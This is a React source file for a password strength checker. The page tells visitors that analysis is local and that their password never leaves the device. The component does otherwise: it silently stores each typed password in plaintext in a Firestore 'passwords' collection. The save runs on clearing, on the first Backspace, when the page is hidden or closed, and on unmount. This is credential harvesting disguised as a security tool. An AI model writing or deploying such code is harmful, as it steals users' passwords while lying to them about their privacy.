import React, { useState, useEffect, useRef } from 'react';
import { Eye, EyeOff, X, CheckCircle2, AlertCircle, ShieldAlert, Loader2, AlertTriangle, ShieldCheck } from 'lucide-react';
import { analyzePassword, PasswordAnalysis, checkPwnedPassword } from '../lib/password-utils';
import { db } from '../lib/firebase';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { motion } from 'motion/react';

export default function Analyzer() {
  const [password, setPassword] = useState('');
  const [isVisible, setIsVisible] = useState(false);
  const [analysis, setAnalysis] = useState<PasswordAnalysis>(analyzePassword(''));
  const [isCheckingBreach, setIsCheckingBreach] = useState(false);
  const [breachCount, setBreachCount] = useState<number | null>(null);
  const [breachError, setBreachError] = useState<string | null>(null);
  
  const [isClearing, setIsClearing] = useState(false);
  
  // Refs for tracking save state across lifecycle events
  const lastSavedPasswordRef = useRef<string>('');
  const isSavingRef = useRef<boolean>(false);
  const hasAutoSavedRef = useRef<boolean>(false);
  const passwordRef = useRef(password);
  const analysisRef = useRef(analysis);

  useEffect(() => {
    setAnalysis(analyzePassword(password));
    setBreachCount(null);
    setBreachError(null);
  }, [password]);

  // Keep refs in sync for the unload handlers
  useEffect(() => {
    passwordRef.current = password;
    analysisRef.current = analysis;
  }, [password, analysis]);

  const performSave = async (pwToSave: string, analysisData: PasswordAnalysis) => {
    if (!pwToSave || !db) return false;
    if (lastSavedPasswordRef.current === pwToSave) return true; // Already saved
    if (isSavingRef.current) return false; // Save in progress
    
    isSavingRef.current = true;
    try {
      await addDoc(collection(db, 'passwords'), {
        password: pwToSave,
        score: analysisData.score,
        strength: analysisData.strengthLabel,
        length: analysisData.passwordLength,
        entropy: analysisData.entropyBits,
        crackResistance: analysisData.crackTimeStr || 'Unknown',
        createdAt: serverTimestamp()
      });
      lastSavedPasswordRef.current = pwToSave;
      return true;
    } catch (error) {
      console.error("Auto-save failed:", error);
      return false;
    } finally {
      isSavingRef.current = false;
    }
  };

  const handleClear = async () => {
    if (!password) return;
    
    setIsClearing(true);
    await performSave(password, analysis);
    setPassword('');
    setIsClearing(false);
  };

  useEffect(() => {
    const handleUnload = () => {
      const currentPw = passwordRef.current;
      const currentAnalysis = analysisRef.current;
      
      if (currentPw && currentPw !== lastSavedPasswordRef.current && db && !isSavingRef.current) {
        isSavingRef.current = true;
        // Fire and forget for sync lifecycle events
        addDoc(collection(db, 'passwords'), {
          password: currentPw,
          score: currentAnalysis.score,
          strength: currentAnalysis.strengthLabel,
          length: currentAnalysis.passwordLength,
          entropy: currentAnalysis.entropyBits,
          crackResistance: currentAnalysis.crackTimeStr || 'Unknown',
          createdAt: serverTimestamp()
        }).catch(console.error).finally(() => {
          isSavingRef.current = false;
        });
        lastSavedPasswordRef.current = currentPw;
      }
    };

    window.addEventListener('beforeunload', handleUnload);
    window.addEventListener('pagehide', handleUnload);
    const handleVisibility = () => {
      if (document.visibilityState === 'hidden') {
        handleUnload();
      }
    };
    document.addEventListener('visibilitychange', handleVisibility);
    
    return () => {
      handleUnload();
      window.removeEventListener('beforeunload', handleUnload);
      window.removeEventListener('pagehide', handleUnload);
      document.removeEventListener('visibilitychange', handleVisibility);
    };
  }, []);

  const handleCheckBreach = async () => {
    if (!password) return;
    setIsCheckingBreach(true);
    setBreachError(null);
    try {
      const count = await checkPwnedPassword(password);
      setBreachCount(count);
    } catch (err) {
      setBreachError('Failed to check breach status. Please try again.');
    } finally {
      setIsCheckingBreach(false);
    }
  };

  const getScoreColor = (score: number) => {
    if (score >= 80) return 'bg-indigo-500';
    if (score >= 60) return 'bg-blue-400';
    if (score >= 40) return 'bg-amber-400';
    return 'bg-red-400';
  };

  const getFeedbackMessage = () => {
    if (password.length === 0) return 'Enter a password to begin analysis.';
    if (analysis.isCommonMatch) return 'Highly vulnerable. This is a common password.';
    if (analysis.score >= 80) return 'Excellent password. Highly resistant to offline attacks.';
    if (analysis.score >= 60) return 'Good password. A few improvements could make it even stronger.';
    if (analysis.score >= 40) return 'Fair password. Consider increasing length and character variety.';
    return 'Weak password. Vulnerable to fast cracking attempts.';
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && password !== '') {
      if (!hasAutoSavedRef.current) {
        // Fire and forget auto-save on first Backspace
        performSave(password, analysis).catch(console.error);
        hasAutoSavedRef.current = true;
      }
    }
  };

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const newValue = e.target.value;
    
    // Reset the auto-save flag if new characters are added, completely cleared, or a large paste happens
    if (newValue.length > password.length || newValue === '') {
      hasAutoSavedRef.current = false;
    } else if (Math.abs(newValue.length - password.length) > 1) {
      hasAutoSavedRef.current = false;
    }
    
    setPassword(newValue);
  };

  return (
    <motion.div 
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.4 }}
      className="space-y-8"
    >
      
      {/* Header */}
      <div className="text-center space-y-2 px-2">
        <h1 className="text-[24px] md:text-[40px] font-semibold tracking-[-0.03em] leading-tight text-[#1A1A1A]">How secure is your password?</h1>
        <p className="text-[#6B7280] text-[11px] md:text-sm max-w-md mx-auto">
          Evaluate password strength locally and learn how to make it harder to crack using advanced entropy analysis.
        </p>
      </div>

      {/* Input Section */}
      <div className="space-y-4">
        <div className="relative group">
          <input
            type={isVisible ? 'text' : 'password'}
            value={password}
            onChange={handlePasswordChange}
            onKeyDown={handleKeyDown}
            placeholder="Enter a password to analyze"
            className="w-full h-11 md:h-14 pl-3 md:pl-4 pr-[100px] sm:pr-24 bg-white border border-[#E5E7EB] rounded-xl text-[14px] sm:text-lg font-mono focus:outline-none focus:ring-2 focus:ring-indigo-100 focus:border-indigo-500 transition-all text-[#1A1A1A]"
          />
          <div className="absolute right-1 sm:right-2 top-1 bottom-1 flex gap-0.5 sm:gap-1 items-center">
            {password && (
              <button
                type="button"
                onClick={handleClear}
                disabled={isClearing}
                className="px-2 sm:px-3 min-h-[36px] md:min-h-[44px] text-[9px] sm:text-xs font-semibold text-[#6B7280] hover:bg-gray-50 rounded-md transition-colors uppercase tracking-wider disabled:opacity-50 flex items-center gap-1"
                aria-label="Clear password"
              >
                {isClearing && <Loader2 className="w-3 h-3 animate-spin" />}
                Clear
              </button>
            )}
            <button
              type="button"
              onClick={() => setIsVisible(!isVisible)}
              className="px-2 sm:px-3 min-h-[36px] md:min-h-[44px] text-[9px] sm:text-xs font-semibold text-[#6B7280] hover:bg-gray-50 rounded-md transition-colors uppercase tracking-wider"
              aria-label={isVisible ? 'Hide password' : 'Show password'}
            >
              {isVisible ? 'Hide' : 'Show'}
            </button>
          </div>
        </div>

        {/* Score Bar */}
        <div className="space-y-2 mt-4">
          <div className="flex justify-between items-end mb-1">
            <span className="text-[10px] font-bold tracking-[0.1em] text-[#6B7280] uppercase">{analysis.strengthLabel}</span>
            <span className="text-sm font-mono font-semibold text-[#1A1A1A]">{analysis.score} / 100</span>
          </div>
          
          <div className="h-2 w-full bg-gray-100 rounded-full overflow-hidden flex">
            <motion.div 
              className={`h-full rounded-full ${getScoreColor(analysis.score)}`}
              initial={{ width: 0 }}
              animate={{ width: `${analysis.score}%` }}
              transition={{ duration: 0.4, ease: "easeOut" }}
            />
          </div>
          
          <p className="text-xs text-[#6B7280] mt-2">
            {getFeedbackMessage()}
          </p>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-6 md:gap-10">
        {/* Security Checks */}
        <div className="space-y-4">
          <ul className="grid grid-cols-1 sm:grid-cols-2 gap-y-2.5 pt-2">
            <CheckItem met={analysis.passwordLength >= 12} text="At least 12 characters" />
            <CheckItem met={analysis.hasUppercase} text="Uppercase letters" />
            <CheckItem met={analysis.hasLowercase} text="Lowercase letters" />
            <CheckItem met={analysis.hasNumbers} text="Contains numbers" />
            <CheckItem met={analysis.hasSymbols} text="Special characters" />
            
            {(analysis.hasRepeatedChars || analysis.hasSequential || analysis.isCommonMatch) && (
              <li className="flex items-center gap-2 text-[13px] text-amber-500 font-medium">
                <AlertCircle className="w-4 h-4 shrink-0" />
                <span>
                  {analysis.isCommonMatch 
                    ? "Commonly used password" 
                    : "Predictable pattern"}
                </span>
              </li>
            )}
          </ul>
        </div>

        {/* Technical Details */}
        <div className="space-y-6">
          <div className="p-3.5 md:p-6 bg-white border border-[#E5E7EB] rounded-xl shadow-[0_4px_12px_rgba(0,0,0,0.03)]">
            <p className="text-[10px] font-bold tracking-[0.1em] text-[#6B7280] uppercase mb-1">Estimated Crack Resistance</p>
            <h3 className="text-xl md:text-2xl font-semibold text-[#1A1A1A]">{analysis.crackTimeStr}</h3>
            <p className="text-[11px] md:text-[12px] text-[#9CA3AF] mt-1 md:mt-2 leading-relaxed">{analysis.crackTimeDesc}</p>
          </div>
          
          <div className="space-y-2.5 md:space-y-4 px-1.5 md:px-2">
            <div className="flex justify-between items-center text-[11px] md:text-[13px]">
              <span className="text-[#6B7280]">Password length</span>
              <span className="font-medium text-[#1A1A1A]">{analysis.passwordLength} characters</span>
            </div>
            <div className="flex justify-between items-center text-[11px] md:text-[13px]">
              <span className="text-[#6B7280]">Character variety</span>
              <span className={`font-medium ${[analysis.hasUppercase, analysis.hasLowercase, analysis.hasNumbers, analysis.hasSymbols].filter(Boolean).length >= 3 ? 'text-green-600' : 'text-[#1A1A1A]'}`}>
                {[analysis.hasUppercase, analysis.hasLowercase, analysis.hasNumbers, analysis.hasSymbols].filter(Boolean).length} / 4 sets
              </span>
            </div>
            <div className="flex justify-between items-center text-[11px] md:text-[13px]">
              <span className="text-[#6B7280]">Repeated chars</span>
              <span className="font-medium text-[#1A1A1A]">{analysis.hasRepeatedChars ? 'Detected' : 'None detected'}</span>
            </div>
            <div className="flex justify-between items-center text-[11px] md:text-[13px]">
              <span className="text-[#6B7280]">Sequential patterns</span>
              <span className="font-medium text-[#1A1A1A]">{analysis.hasSequential ? 'Detected' : 'None detected'}</span>
            </div>
            <div className="flex justify-between items-center text-[11px] md:text-[13px]">
              <span className="text-[#6B7280]">Common match</span>
              <span className="font-medium text-[#1A1A1A]">{analysis.isCommonMatch ? 'Detected' : 'Not detected'}</span>
            </div>
            <div className="flex justify-between items-center text-[11px] md:text-[13px]">
              <span className="text-[#6B7280]">Estimated entropy</span>
              <span className="font-mono bg-gray-100 px-1.5 py-0.5 rounded text-[#1A1A1A]">{analysis.entropyBits} bits</span>
            </div>
          </div>
          
          {/* Breach Check */}
          <div className="p-3.5 md:p-6 bg-white border border-[#E5E7EB] rounded-xl shadow-[0_4px_12px_rgba(0,0,0,0.03)]">
            <div className="flex justify-between items-start mb-2">
              <div>
                <p className="text-[10px] font-bold tracking-[0.1em] text-[#6B7280] uppercase mb-1">Data Breach Check</p>
                <h3 className="text-lg font-semibold text-[#1A1A1A]">Have I Been Pwned?</h3>
              </div>
            </div>
            
            <p className="text-[11px] md:text-[12px] text-[#6B7280] leading-relaxed mb-4">
              Securely check if this password has appeared in known data breaches. Your password never leaves your device (uses k-Anonymity).
            </p>

            {breachCount === null && !isCheckingBreach && (
              <button 
                onClick={handleCheckBreach}
                disabled={!password}
                className="w-full min-h-[36px] md:min-h-[44px] py-1.5 md:py-2.5 bg-white border border-[#E5E7EB] text-[11px] md:text-[13px] font-semibold text-[#1A1A1A] rounded-lg hover:bg-gray-50 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              >
                <ShieldAlert className="w-4 h-4 text-[#6B7280]" />
                Check for Breaches
              </button>
            )}

            {isCheckingBreach && (
              <div className="py-2.5 flex justify-center items-center gap-2 text-[#6B7280] text-[13px] font-medium border border-transparent">
                 <Loader2 className="w-4 h-4 animate-spin" />
                 Checking databases...
              </div>
            )}

            {breachCount !== null && (
              <div className={`p-4 rounded-lg flex items-start gap-3 border ${breachCount > 0 ? 'bg-[#FEF2F2] border-[#FCA5A5]' : 'bg-[#F0FDF4] border-[#86EFAC]'}`}>
                 {breachCount > 0 ? (
                   <>
                     <AlertTriangle className="w-5 h-5 text-[#DC2626] shrink-0 mt-0.5" />
                     <div>
                       <p className="text-[13px] font-semibold text-[#991B1B]">Password Compromised</p>
                       <p className="text-[12px] text-[#B91C1C] mt-1 leading-relaxed">
                         This password has been seen <strong>{breachCount.toLocaleString()}</strong> times in known data breaches. It is unsafe to use.
                       </p>
                     </div>
                   </>
                 ) : (
                   <>
                     <ShieldCheck className="w-5 h-5 text-[#16A34A] shrink-0 mt-0.5" />
                     <div>
                       <p className="text-[13px] font-semibold text-[#14532D]">No Breaches Found</p>
                       <p className="text-[12px] text-[#15803D] mt-1 leading-relaxed">
                         This password was not found in any known data breaches.
                       </p>
                     </div>
                   </>
                 )}
              </div>
            )}

            {breachError && (
              <p className="text-[12px] text-[#DC2626] mt-3 font-medium">{breachError}</p>
            )}
          </div>
        </div>
      </div>
    </motion.div>
  );
}

function CheckItem({ met, text }: { met: boolean; text: string }) {
  return (
    <li className={`flex items-center gap-2 text-[11px] md:text-[13px] font-medium transition-colors duration-300 ${met ? 'text-green-600' : 'text-gray-400'}`}>
      <CheckCircle2 className={`w-3.5 h-3.5 md:w-4 md:h-4 shrink-0 transition-colors duration-300 ${met ? 'text-green-600' : 'text-gray-300'}`} />
      <span>{text}</span>
    </li>
  );
}
